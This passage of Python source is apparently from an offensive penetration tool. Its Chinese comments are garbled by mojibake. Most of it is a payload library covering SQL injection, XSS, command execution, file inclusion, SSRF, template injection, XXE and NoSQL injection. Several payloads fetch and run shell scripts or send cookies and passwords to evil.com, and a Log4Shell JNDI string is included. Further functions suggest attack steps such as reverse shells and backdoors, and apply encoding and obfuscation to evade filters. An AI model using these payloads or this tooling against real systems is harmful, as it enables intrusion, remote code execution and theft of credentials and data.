            # CPUä½¿ç”¨ç‡
            cpu_usage = psutil.cpu_percent()
            # å†…å­˜ä½¿ç”¨ç‡
            memory_usage = psutil.virtual_memory().percent

            # è®¡ç®—èµ„æºå¥åº·åº¦
            cpu_health = max(0, 100 - cpu_usage * 0.8)
            memory_health = max(0, 100 - memory_usage * 0.8)

            return (cpu_health + memory_health) / 2

        except Exception as e:
            logger.error(f"èµ„æºå¥åº·æ£€æŸ¥å¤±è´¥: {e}")
            return 50.0

    def perform_repair(self):
        """æ‰§è¡Œè‡ªæˆ‘ä¿®å¤"""
        repair_actions = []

        try:
            # 1. æ¸…ç†å†…å­˜
            if self.health_status['resource_health'] < 70:
                self._cleanup_memory()
                repair_actions.append("memory_cleanup")

            # 2. é‡å¯æ¨¡å‹æ¨ç†
            if self.health_status['model_health'] < 70:
                self._reload_model()
                repair_actions.append("model_reload")

            # 3. é‡ç½®APIçŠ¶æ€
            if self.health_status['api_health'] < 70:
                self._reset_api()
                repair_actions.append("api_reset")

            self.health_status['repair_count'] += 1
            self.health_status['issues_found'] += len(repair_actions)

            logger.info(f"ğŸ”§ è‡ªæˆ‘ä¿®å¤å®Œæˆ: {repair_actions}")
            return repair_actions

        except Exception as e:
            logger.error(f"è‡ªæˆ‘ä¿®å¤å¤±è´¥: {e}")
            return ["repair_failed"]

    def _cleanup_memory(self):
        """æ¸…ç†å†…å­˜"""
        import gc
        gc.collect()
        if torch.cuda.is_available():
            torch.cuda.empty_cache()

    def _reload_model(self):
        """é‡æ–°åŠ è½½æ¨¡å‹"""
        try:
            # ä¿å­˜å½“å‰çŠ¶æ€
            current_state = self.brain_api.model.state_dict()
            # é‡æ–°åˆå§‹åŒ–
            self.brain_api.model.load_state_dict(current_state)
        except Exception as e:
            logger.error(f"æ¨¡å‹é‡è½½å¤±è´¥: {e}")

    def _reset_api(self):
        """é‡ç½®APIçŠ¶æ€"""
        # æ¸…ç†ç¼“å­˜å’Œä¸´æ—¶çŠ¶æ€
        if hasattr(self.brain_api, 'cache'):
            self.brain_api.cache.clear()


# ==================== æ”»å‡»çŸ¥è¯†åº“ç±» ====================
class AttackKnowledgeBase:
    def __init__(self):
        self.attack_patterns = self._load_attack_patterns()
        self.exploit_techniques = self._load_exploit_techniques()
        self.payload_library = self._load_payload_library()
        self.attack_history = deque(maxlen=5000)
        self.vulnerability_db = self._load_vulnerability_database()
        self.technique_frameworks = self._load_technique_frameworks()
        logger.info("âœ… é¡¶çº§æ”»å‡»çŸ¥è¯†åº“åˆå§‹åŒ–å®Œæˆ - Python 3.12")

    def _load_attack_patterns(self):
        """åŠ è½½å®Œæ•´çš„æ”»å‡»æ¨¡å¼åº“"""
        return {
            'sql_injection': {
                'union_based': {'risk': 0.85, 'complexity': 0.6, 'detection': 0.7},
                'error_based': {'risk': 0.8, 'complexity': 0.7, 'detection': 0.6},
                'time_based': {'risk': 0.9, 'complexity': 0.8, 'detection': 0.4},
                'boolean_based': {'risk': 0.88, 'complexity': 0.9, 'detection': 0.3},
                'out_of_band': {'risk': 0.95, 'complexity': 0.95, 'detection': 0.2},
                'stacked_queries': {'risk': 0.92, 'complexity': 0.85, 'detection': 0.5}
            },
            'xss': {
                'reflected': {'risk': 0.7, 'complexity': 0.5, 'detection': 0.8},
                'stored': {'risk': 0.85, 'complexity': 0.6, 'detection': 0.7},
                'dom_based': {'risk': 0.75, 'complexity': 0.7, 'detection': 0.6},
                'blind_xss': {'risk': 0.8, 'complexity': 0.8, 'detection': 0.3}
            },
            'rce': {
                'command_injection': {'risk': 0.95, 'complexity': 0.7, 'detection': 0.6},
                'code_injection': {'risk': 0.93, 'complexity': 0.8, 'detection': 0.5},
                'deserialization': {'risk': 0.97, 'complexity': 0.9, 'detection': 0.4},
                'template_injection': {'risk': 0.9, 'complexity': 0.85, 'detection': 0.4}
            },
            'lfi_rfi': {
                'local_file_include': {'risk': 0.8, 'complexity': 0.6, 'detection': 0.7},
                'remote_file_include': {'risk': 0.9, 'complexity': 0.7, 'detection': 0.6},
                'directory_traversal': {'risk': 0.75, 'complexity': 0.5, 'detection': 0.8}
            },
            'ssrf': {
                'basic_ssrf': {'risk': 0.85, 'complexity': 0.6, 'detection': 0.5},
                'advanced_ssrf': {'risk': 0.95, 'complexity': 0.8, 'detection': 0.3}
            },
            'business_logic': {
                'auth_bypass': {'risk': 0.9, 'complexity': 0.7, 'detection': 0.4},
                'privilege_escalation': {'risk': 0.95, 'complexity': 0.8, 'detection': 0.3},
                'race_condition': {'risk': 0.85, 'complexity': 0.9, 'detection': 0.2}
            }
        }

    def _load_exploit_techniques(self):
        """åŠ è½½MITRE ATT&CKé£æ ¼çš„åˆ©ç”¨æŠ€æœ¯"""
        return {
            'reconnaissance': {
                'active_scanning': ['port_scan', 'service_detection', 'vulnerability_scan'],
                'passive_scanning': ['google_dorking', 'certificate_analysis', 'whois_lookup'],
                'information_gathering': ['subdomain_enum', 'directory_bruteforce', 'technology_fingerprinting']
            },
            'initial_access': {
                'web_attacks': ['sql_injection', 'xss', 'file_upload', 'rce'],
                'service_attacks': ['ssh_bruteforce', 'ftp_anonymous', 'redis_unauth'],
                'social_engineering': ['phishing', 'waterhole_attack', 'pretexting']
            },
            'execution': {
                'command_execution': ['reverse_shell', 'web_shell', 'command_injection'],
                'code_execution': ['deserialization', 'template_injection', 'memory_corruption'],
                'script_execution': ['powershell', 'python', 'javascript']
            },
            'persistence': {
                'account_manipulation': ['backdoor_account', 'ssh_key_injection', 'token_manipulation'],
                'scheduled_tasks': ['cron_job', 'windows_task', 'systemd_service'],
                'web_persistence': ['web_shell', 'hidden_page', 'database_storage']
            },
            'lateral_movement': {
                'remote_services': ['psexec', 'wmi', 'ssh'],
                'exploitation': ['pass_the_hash', 'golden_ticket', 'silver_ticket'],
                'deployment_tools': ['sccm', 'ansible', 'puppet']
            }
        }

    def _load_payload_library(self):
        """ä¸“ä¸šçº§æ¸—é€æµ‹è¯•payloadåº“ - Python 3.12å…¼å®¹ç‰ˆ"""
        return {
            'sql_injection': [
                # ==================== UNIONæ³¨å…¥ ====================
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT version(),user(),database()--",
                "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users--",
                "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--",

                # ==================== æŠ¥é”™æ³¨å…¥ ====================
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables),0x7e),1)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

                # ==================== æ—¶é—´ç›²æ³¨ ====================
                "' AND IF(ASCII(SUBSTR(version(),1,1))=53,SLEEP(5),0)--",
                "' AND IF(EXISTS(SELECT * FROM users WHERE username='admin'),SLEEP(3),0)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5-(IF(ASCII(SUBSTR(version(),1,1))=53,0,5)))))a)--",

                # ==================== å¸ƒå°”ç›²æ³¨ ====================
                "' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>50--",
                "' AND LENGTH((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables))>10--",
                "' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0--",

                # ==================== å †å æŸ¥è¯¢ ====================
                "'; DROP TABLE users--",
                "'; CREATE TABLE hacked(data TEXT)--",
                "'; INSERT INTO hacked VALUES('pwned')--",

                # ==================== OOBå¸¦å¤– ====================
                "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.evil.com\\\\test')))--",
                "' AND (SELECT http_get(CONCAT('http://evil.com/?data=',(SELECT version()))))--"
            ],

            'time_based_sql': [
                # ==================== MySQLæ—¶é—´ç›²æ³¨ ====================
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "' AND BENCHMARK(5000000,SHA1(1))--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",

                # ==================== PostgreSQL ====================
                "' AND (SELECT pg_sleep(5))--",
                "' OR (SELECT pg_sleep(5))--",

                # ==================== MSSQL ====================
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR WAITFOR DELAY '00:00:05'--",

                # ==================== Oracle ====================
                "' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL)--",
                "' OR (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL)--"
            ],

            'xss': [
                # ==================== åå°„å‹XSS ====================
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",

                # ==================== å­˜å‚¨å‹XSS ====================
                "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
                "<iframe src=javascript:alert('XSS')>",

                # ==================== DOMå‹XSS ====================
                "javascript:alert('XSS')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",

                # ==================== é«˜çº§ç»•è¿‡ ====================
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<img src=x oneonerrorrror=alert('XSS')>",
                "javascript:fetch('/steal?data='+btoa(document.cookie))"
            ],

            'rce': [
                # ==================== Unix/Linux ====================
                "; whoami",
                "| id",
                "`id`",
                "$(id)",
                "|| curl http://evil.com/shell.sh | bash",

                # ==================== Windows ====================
                "| whoami",
                "& whoami",
                "| powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/exploit.ps1')\"",

                # ==================== PHPä»£ç æ‰§è¡Œ ====================
                "; system('whoami');",
                "| php -r \"system('whoami');\"",
                "`php -r \"system('whoami');\"`",

                # ==================== Pythonä»£ç æ‰§è¡Œ ====================
                "; python3 -c \"import os; os.system('whoami')\"",
                "| python3 -c \"import os; print(os.popen('whoami').read())\"",

                # ==================== ç¼–ç æ··æ·† ====================
                "echo -n 'd2hvYW1p' | base64 -d | bash",
                "python3 -c \"exec(__import__('base64').b64decode('d2hvYW1p'))\""
            ],

            'lfi_rfi': [
                # ==================== è·¯å¾„éå† ====================
                "../../../../etc/passwd",
                "....//....//....//....//etc/passwd",
                "..%2f..%2f..%2f..%2fetc/passwd",
                "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",

                # ==================== PHPåŒ…è£…å™¨ ====================
                "php://filter/convert.base64-encode/resource=index.php",
                "php://filter/read=string.rot13/resource=/etc/passwd",
                "php://input",
                "expect://whoami",

                # ==================== RFIè¿œç¨‹åŒ…å« ====================
                "http://evil.com/shell.txt",
                "\\\\evil.com\\share\\shell.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
            ],

            'ssrf': [
                # ==================== åŸºç¡€SSRF ====================
                "http://localhost:22",
                "http://127.0.0.1:6379",
                "http://169.254.169.254/latest/meta-data/",

                # ==================== åè®®åˆ©ç”¨ ====================
                "gopher://127.0.0.1:6379/_FLUSHALL",
                "dict://127.0.0.1:6379/FLUSHALL",
                "file:///etc/passwd",

                # ==================== äº‘å…ƒæ•°æ® ====================
                "http://169.254.169.254/latest/user-data",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/"
            ],

            'deserialization': [
                # ==================== PHPååºåˆ—åŒ– ====================
                'O:8:"stdClass":0:{}',
                'O:4:"Test":1:{s:4:"data";s:10:"malicious";}',

                # ==================== Javaååºåˆ—åŒ– ====================
                '{"@type":"java.net.Inet4Address","val":"dnslog.cn"}',
                '{"object":["java.net.URL","http://evil.com"]}',

                # ==================== Pythonååºåˆ—åŒ– ====================
                '{"__class__":"__main__.Exploit", "__init__": {"__globals__": {"os": {"system": "whoami"}}}}'
            ],

            'ssti': [
                # ==================== Jinja2æ¨¡æ¿æ³¨å…¥ ====================
                "{{ config.items() }}",
                "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                "{{ ''.__class__.__mro__[1].__subclasses__()[408]('whoami', shell=True, stdout=-1).communicate() }}",

                # ==================== Twigæ¨¡æ¿æ³¨å…¥ ====================
                "{{ _self.env.getFilter('exec')('whoami') }}",
                "{{ app.request.server.get('SERVER_ADDR') }}",

                # ==================== Freemarker ====================
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }"
            ],

            'xxe': [
                # ==================== å¤–éƒ¨å®ä½“æ³¨å…¥ ====================
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]>',

                # ==================== ç›²æ³¨XXE ====================
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://evil.com/?data=%xxe;\'>">%eval;%exfil;]>'
            ],

            'nosql_injection': [
                # ==================== MongoDB ====================
                '{"$where": "this.username == \'admin\' && this.password.length > 0"}',
                '{"username": {"$ne": null}, "password": {"$ne": null}}',
                '{"username": {"$regex": ".*"}, "password": {"$exists": true}}',

                # ==================== è¿ç®—ç¬¦æ³¨å…¥ ====================
                '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
                '{"$or": [{"username": "admin"}, {"username": "administrator"}]}'
            ],

            'header_injection': [
                # ==================== Hostå¤´æ³¨å…¥ ====================
                "Host: evil.com",
                "Host: localhost:22",

                # ==================== X-Forwardedå¤´æ³¨å…¥ ====================
                "X-Forwarded-For: 127.0.0.1",
                "X-Forwarded-Host: evil.com",

                # ==================== URLé‡å®šå‘ ====================
                "Location: http://evil.com",
                "Refresh: 0; url=http://evil.com"
            ]
        }

    def _load_vulnerability_database(self):
        """åŠ è½½æ¼æ´æ•°æ®åº“"""
        return {
            'cve_2021_44228': {
                'name': 'Log4Shell',
                'type': 'rce',
                'risk': 0.99,
                'complexity': 0.6,
                'payloads': ['${jndi:ldap://evil.com/a}']
            },
            'cve_2021_34527': {
                'name': 'ProxyShell',
                'type': 'rce',
                'risk': 0.95,
                'complexity': 0.7,
                'payloads': ['/autodiscover/autodiscover.json']
            },
            'cve_2019_19781': {
                'name': 'Citrix ADC RCE',
                'type': 'rce',
                'risk': 0.96,
                'complexity': 0.6,
                'payloads': ['/vpn/../vpns/portal/scripts/newbm.pl']
            }
        }

    def _load_technique_frameworks(self):
        """åŠ è½½æ”»å‡»æ¡†æ¶"""
        return {
            'mitre_attck': {
                'techniques': ['T1190', 'T1068', 'T1059', 'T1071'],
                'tactics': ['initial_access', 'execution', 'persistence', 'lateral_movement']
            },
            'owasp_top_10': {
                '2021': ['A01:2021', 'A02:2021', 'A03:2021'],
                '2017': ['A1:2017', 'A2:2017', 'A3:2017']
            },
            'wasc': {
                'categories': ['WASC-19', 'WASC-20', 'WASC-21']
            }
        }

    def get_attack_patterns(self, attack_type=None, min_risk=0.0):
        """è·å–æ”»å‡»æ¨¡å¼ - æ”¯æŒé£é™©è¿‡æ»¤"""
        if attack_type:
            patterns = self.attack_patterns.get(attack_type, {})
            return {k: v for k, v in patterns.items() if v['risk'] >= min_risk}
        return self.attack_patterns

    def get_exploit_techniques(self, phase=None, technique_type=None):
        """è·å–åˆ©ç”¨æŠ€æœ¯ - æ”¯æŒå¤šçº§æŸ¥è¯¢"""
        if phase and technique_type:
            return self.exploit_techniques.get(phase, {}).get(technique_type, [])
        elif phase:
            return self.exploit_techniques.get(phase, {})
        return self.exploit_techniques

    def get_payloads(self, payload_type, count=5, complexity_filter=None):
        """è·å–payload - æ”¯æŒå¤æ‚åº¦è¿‡æ»¤"""
        payloads = self.payload_library.get(payload_type, [])
        if complexity_filter == 'simple':
            return payloads[:min(count, 3)]
        elif complexity_filter == 'advanced':
            return payloads[-min(count, len(payloads)):]
        return payloads[:count]

    def get_vulnerability_info(self, cve_id=None):
        """è·å–æ¼æ´ä¿¡æ¯"""
        if cve_id:
            return self.vulnerability_db.get(cve_id.lower())
        return self.vulnerability_db

    def get_framework_techniques(self, framework):
        """è·å–æ”»å‡»æ¡†æ¶æŠ€æœ¯"""
        return self.technique_frameworks.get(framework, {})

    def record_attack(self, attack_data):
        """è®°å½•æ”»å‡»å†å² - å¢å¼ºç‰ˆ"""
        attack_data.update({
            'timestamp': datetime.now().isoformat(),
            'attack_id': f"attack_{hash(str(attack_data))}",
            'success_probability': self._calculate_success_probability(attack_data)
        })
        self.attack_history.append(attack_data)
        return attack_data['attack_id']

    def get_attack_history(self, limit=20, min_risk=0.0):
        """è·å–æ”»å‡»å†å² - æ”¯æŒé£é™©è¿‡æ»¤"""
        history = list(self.attack_history)[-limit:]
        return [item for item in history if item.get('risk', 0) >= min_risk]

    def suggest_attack(self, target_info, current_phase=None):
        """å»ºè®®æ”»å‡»ç­–ç•¥ - å¢å¼ºç‰ˆ"""
        suggestions = []
        target_lower = str(target_info).lower() if target_info else ""

        # åŸºäºç›®æ ‡ä¿¡æ¯æ¨è
        tech_keywords = {
            'sql': ['sql_injection', 'database_enum', 'sqlmap_scan'],
            'web': ['xss', 'csrf', 'file_upload', 'lfi'],
            'network': ['port_scan', 'service_detection', 'ssrf'],
            'system': ['rce', 'command_injection', 'deserialization'],
            'cloud': ['ssrf', 'metadata_api', 'bucket_enum']
        }

        for category, attacks in tech_keywords.items():
            if any(kw in target_lower for kw in [category] + attacks[:2]):
                suggestions.extend(attacks)

        # åŸºäºå½“å‰é˜¶æ®µæ¨è
        phase_suggestions = {
            'reconnaissance': ['subdomain_enum', 'technology_detection', 'port_scan'],
            'vulnerability': ['sql_injection', 'xss', 'rce_test'],
            'exploitation': ['reverse_shell', 'privilege_escalation', 'lateral_movement'],
            'persistence': ['backdoor', 'web_shell', 'scheduled_task']
        }

        if current_phase and current_phase in phase_suggestions:
            suggestions.extend(phase_suggestions[current_phase])

        # é»˜è®¤å»ºè®®
        if not suggestions:
            suggestions.extend(['comprehensive_scan', 'technology_fingerprinting'])

        return list(dict.fromkeys(suggestions))[:8]  # å»é‡å¹¶é™åˆ¶æ•°é‡

    def _calculate_success_probability(self, attack_data):
        """è®¡ç®—æ”»å‡»æˆåŠŸæ¦‚ç‡"""
        base_prob = 0.5
        # åŸºäºæ”»å‡»ç±»å‹è°ƒæ•´æ¦‚ç‡
        attack_type = attack_data.get('type', '')
        if 'sql_injection' in attack_type:
            base_prob += 0.2
        if 'rce' in attack_type:
            base_prob += 0.15
        if 'xss' in attack_type:
            base_prob += 0.1
        return min(base_prob, 0.95)

    def analyze_attack_surface(self, target_url):
        """åˆ†ææ”»å‡»é¢"""
        from urllib.parse import urlparse
        import tldextract

        parsed = urlparse(target_url)
        domain_info = tldextract.extract(target_url)

        return {
            'domain': domain_info.domain,
            'tld': domain_info.suffix,
            'subdomain': domain_info.subdomain,
            'path': parsed.path,
            'parameters': parsed.query,
            'technology_hints': self._detect_technology_hints(target_url),
            'attack_vectors': self._suggest_attack_vectors(target_url)
        }

    def _detect_technology_hints(self, url):
        """æ£€æµ‹æŠ€æœ¯æ ˆçº¿ç´¢"""
        hints = []
        url_lower = url.lower()

        tech_patterns = {
            'wordpress': ['wp-content', 'wp-admin', 'wp-includes'],
            'joomla': ['joomla', 'components/', 'modules/'],
            'drupal': ['drupal', 'sites/all'],
            'asp_net': ['.aspx', '__VIEWSTATE'],
            'php': ['.php', 'index.php'],
            'java': ['.jsp', '.do', '.action']
        }

        for tech, patterns in tech_patterns.items():
            if any(pattern in url_lower for pattern in patterns):
                hints.append(tech)

        return hints

    def _suggest_attack_vectors(self, url):
        """å»ºè®®æ”»å‡»å‘é‡"""
        vectors = []
        url_lower = url.lower()

        if any(x in url_lower for x in ['.php', '.asp', '.jsp']):
            vectors.extend(['sql_injection', 'lfi', 'rce'])
        if 'upload' in url_lower:
            vectors.append('file_upload')
        if 'api' in url_lower:
            vectors.extend(['insecure_deserialization', 'ssrf'])
        if any(x in url_lower for x in ['search', 'q=', 'query=']):
            vectors.extend(['sql_injection', 'xss'])

        return vectors if vectors else ['comprehensive_scan']

# ==================== å¤šæ¨¡æ€åˆ†æç³»ç»Ÿ ====================
class MultimodalAnalyzer:
    def __init__(self):
        self.modalities = {
            'attack_pattern': self._analyze_attack_pattern,
            'payload_effectiveness': self._analyze_payload_effectiveness,
            'obfuscation_level': self._analyze_obfuscation,
            'exploit_chaining': self._analyze_exploit_chaining,
            'stealth_rating': self._analyze_stealth
        }

    def analyze(self, input_data):
        """å¤šæ¨¡æ€æ¸—é€åˆ†æ - Python 3.12å…¼å®¹"""
        try:
            if not input_data:
                return self._create_attack_result("æ— è¾“å…¥æ•°æ®")

            # å¤„ç†JSONå’Œæ–‡æœ¬è¾“å…¥
            if isinstance(input_data, dict):
                text = input_data.get('text', '')
            else:
                text = str(input_data)

            if not text.strip():
                return self._create_attack_result("ç©ºæ–‡æœ¬")

            results = {}

            # æ”»å‡»æ¨¡å¼åˆ†æ
            for modality_name, analyzer_func in self.modalities.items():
                try:
                    results[modality_name] = analyzer_func(text)
                except Exception as e:
                    results[modality_name] = {'error': str(e), 'status': 'failed'}

            return {
                'status': 'success',
                'penetration_analysis': results,
                'attack_confidence': self._calculate_attack_confidence(results),
                'recommended_actions': self._generate_attack_actions(results, text),
                'target_evaluation': self._evaluate_target(text),
                'mode': 'offensive_security',
                'timestamp': datetime.now().isoformat()
            }

        except Exception as e:
            logger.error("å¤šæ¨¡æ€åˆ†æé”™è¯¯: %s", str(e))
            return self._create_attack_result("åˆ†æå¤±è´¥: " + str(e))

    def _analyze_attack_pattern(self, text):
        """åˆ†ææ”»å‡»æ¨¡å¼"""
        try:
            patterns = []
            text_lower = text.lower()

            # SQLæ³¨å…¥æ£€æµ‹
            sql_keywords = ['union', 'select', 'from', 'where', 'drop', 'insert']
            if any(kw in text_lower for kw in sql_keywords):
                patterns.append({'type': 'sql_injection', 'confidence': 0.85, 'complexity': 'medium'})

            # XSSæ£€æµ‹
            xss_keywords = ['script', 'alert', 'onerror', 'onload', 'javascript:']
            if any(kw in text_lower for kw in xss_keywords):
                patterns.append({'type': 'xss', 'confidence': 0.75, 'complexity': 'low'})

            # RCEæ£€æµ‹
            rce_keywords = ['system', 'exec', 'passthru', 'shell', 'whoami']
            if any(kw in text_lower for kw in rce_keywords):
                patterns.append({'type': 'rce', 'confidence': 0.9, 'complexity': 'high'})

            return {'detected_patterns': patterns, 'status': 'success', 'count': len(patterns)}

        except Exception as e:
            return {'error': str(e), 'status': 'failed'}

    def _analyze_payload_effectiveness(self, text):
        """åˆ†æpayloadæœ‰æ•ˆæ€§"""
        try:
            effectiveness = 0.5 + (min(len(text), 200) / 400.0)  # åŸºäºé•¿åº¦
            return {'effectiveness_score': round(effectiveness, 2), 'status': 'success'}
        except Exception:
            return {'effectiveness_score': 0.6, 'status': 'success'}

    def _analyze_obfuscation(self, text):
        """åˆ†ææ··æ·†çº§åˆ«"""
        try:
            obfuscation_score = 0.3
            obfuscation_techniques = []

            if '/*' in text or '*/' in text:
                obfuscation_score += 0.2
                obfuscation_techniques.append('comment_obfuscation')
            if any(c in text for c in ['%00', '%20', '%0a']):
                obfuscation_score += 0.3
                obfuscation_techniques.append('url_encoding')
            if 'base64' in text.lower():
                obfuscation_score += 0.2
                obfuscation_techniques.append('base64_encoding')

            return {
                'obfuscation_level': round(min(obfuscation_score, 1.0), 2),
                'techniques': obfuscation_techniques,
                'status': 'success'
            }
        except Exception:
            return {'obfuscation_level': 0.3, 'status': 'success'}

    def _analyze_exploit_chaining(self, text):
        """åˆ†ææ¼æ´åˆ©ç”¨é“¾å¯èƒ½æ€§"""
        try:
            chain_score = 0.4
            if len(text) > 50:  # é•¿æ–‡æœ¬æ›´å¯èƒ½å½¢æˆåˆ©ç”¨é“¾
                chain_score += 0.2
            return {'chaining_potential': round(chain_score, 2), 'status': 'success'}
        except Exception:
            return {'chaining_potential': 0.5, 'status': 'success'}

    def _analyze_stealth(self, text):
        """åˆ†æéšè”½æ€§"""
        try:
            stealth_score = 0.6
            if len(text) < 30:  # çŸ­payloadæ›´éšè”½
                stealth_score += 0.2
            return {'stealth_rating': round(stealth_score, 2), 'status': 'success'}
        except Exception:
            return {'stealth_rating': 0.5, 'status': 'success'}

    def _calculate_attack_confidence(self, results):
        """è®¡ç®—æ”»å‡»ç½®ä¿¡åº¦"""
        try:
            confidence = 0.5
            if results.get('attack_pattern', {}).get('detected_patterns'):
                confidence += 0.3
            return round(min(confidence, 0.95), 2)
        except Exception:
            return 0.6

    def _generate_attack_actions(self, results, text):
        """ç”Ÿæˆæ”»å‡»è¡ŒåŠ¨å»ºè®®"""
        actions = []

        # åŸºäºæ£€æµ‹åˆ°çš„æ”»å‡»æ¨¡å¼
        patterns = results.get('attack_pattern', {}).get('detected_patterns', [])
        for pattern in patterns:
            if pattern['type'] == 'sql_injection':
                actions.extend(['sqlmap_automation', 'manual_sql_exploit', 'database_dump'])
            elif pattern['type'] == 'xss':
                actions.extend(['xss_scanner', 'cookie_stealing', 'dom_manipulation'])
            elif pattern['type'] == 'rce':
                actions.extend(['reverse_shell', 'command_execution', 'privilege_escalation'])

        # é»˜è®¤ä¾¦å¯Ÿè¡ŒåŠ¨
        if not actions:
            actions.extend(['network_scanning', 'service_enumeration', 'vulnerability_assessment'])

        return actions[:5]

    def _evaluate_target(self, text):
        """è¯„ä¼°ç›®æ ‡ä»·å€¼"""
        return {
            'value_rating': 0.7,
            'recommended_approach': 'stealthy_probing',
            'risk_level': 'medium'
        }

    def _create_attack_result(self, reason):
        """åˆ›å»ºæ”»å‡»åˆ†æç»“æœ"""
        return {
            'status': 'success',
            'penetration_analysis': dict((mod, {'error': reason, 'status': 'failed'}) for mod in self.modalities),
            'attack_confidence': 0.5,
            'recommended_actions': ['reconnaissance', 'target_discovery'],
            'target_evaluation': {'value_rating': 0.5, 'risk_level': 'unknown'},
            'mode': 'offensive_security',
            'fallback_reason': reason,
            'timestamp': datetime.now().isoformat()
        }

# ==================== å¢å¼ºçš„åˆ›é€ æ€§æ”»å‡»ç”Ÿæˆå™¨ ====================
class EnhancedCreativeAttackGenerator:
    def __init__(self, brain_api):
        self.brain_api = brain_api
        self.attack_patterns = self._load_attack_patterns()
        self.creative_mutations = self._load_mutation_rules()
        self.random = random.Random()  # âœ… æ·»åŠ è¿™è¡Œ

    def _load_attack_patterns(self):
        """åŠ è½½åŸºç¡€æ”»å‡»æ¨¡å¼"""
        return {
            'sql_injection': {
                'union_based': ["' UNION SELECT {columns} FROM {table}--",
                                "' UNION ALL SELECT {columns} FROM {table}--"],
                'error_based': ["' AND EXTRACTVALUE(1,CONCAT(0x7e,({query})))--",
                                "' AND UPDATEXML(1,CONCAT(0x7e,({query})),1)--"],
                'time_based': ["' AND IF({condition},SLEEP({time}),0)--",
                               "' OR IF({condition},BENCHMARK({iterations},MD5(1)),0)--"],
                'boolean_based': ["' AND ASCII(SUBSTR(({query}),{position},1))>{value}--",
                                  "' OR LENGTH(({query}))>{length}--"]
            },
            'xss': {
                'reflected': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
                'stored': ['<script>document.cookie</script>', '<svg onload=alert(1)>'],
                'dom_based': ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>']
            }
        }

    def _load_mutation_rules(self):
        """åŠ è½½åˆ›é€ æ€§å˜å¼‚è§„åˆ™"""
        return {
            'encoding': ['URLç¼–ç ', 'HTMLç¼–ç ', 'Unicodeç¼–ç ', 'Base64ç¼–ç ', 'åå…­è¿›åˆ¶ç¼–ç '],
            'case_variation': ['éšæœºå¤§å°å†™', 'äº¤æ›¿å¤§å°å†™', 'å…¨å¤§å†™', 'å…¨å°å†™'],
            'whitespace': ['æ·»åŠ ç©ºæ ¼', 'æ·»åŠ åˆ¶è¡¨ç¬¦', 'æ·»åŠ æ¢è¡Œç¬¦', 'æ·»åŠ æ³¨é‡Š/* */'],
            'keyword_replacement': ['ORâ†’||', 'ANDâ†’&&', '=â†’LIKE', 'SELECTâ†’SELECT%00'],
            'obfuscation': ['å†…è”æ³¨é‡Š', 'å¤šé‡ç¼–ç ', 'åƒåœ¾å­—ç¬¦å¡«å……', 'è¯­æ³•å˜å½¢']
        }

    def generate_creative_attack(self, base_payload, attack_type='sql_injection', creativity_level=0.7):
        """ç”Ÿæˆåˆ›é€ æ€§æ”»å‡»payload"""
        # åŸºç¡€å˜å¼‚
        mutated_payload = self._apply_basic_mutations(base_payload)

        # åˆ›é€ æ€§ç»„åˆ
        if self.random.random() < creativity_level:
            mutated_payload = self._combine_attack_patterns(mutated_payload, attack_type)

        # é«˜çº§æ··æ·†
        if self.random.random() < creativity_level * 0.8:
            mutated_payload = self._apply_advanced_obfuscation(mutated_payload)

        return mutated_payload

    def _apply_basic_mutations(self, payload):
        """åº”ç”¨åŸºç¡€å˜å¼‚"""
        mutations = []

        # ç¼–ç å˜å¼‚
        if self.random.random() < 0.6:
            encoding = self.random.choice(self.creative_mutations['encoding'])
            if encoding == 'URLç¼–ç ':
                payload = self._url_encode_selective(payload)

        # å¤§å°å†™å˜å¼‚
        if self.random.random() < 0.5:
            case_type = self.random.choice(self.creative_mutations['case_variation'])
            payload = self._apply_case_variation(payload, case_type)

        # ç©ºç™½å­—ç¬¦å˜å¼‚
        if self.random.random() < 0.4:
            payload = self._add_whitespace_variation(payload)

        return payload

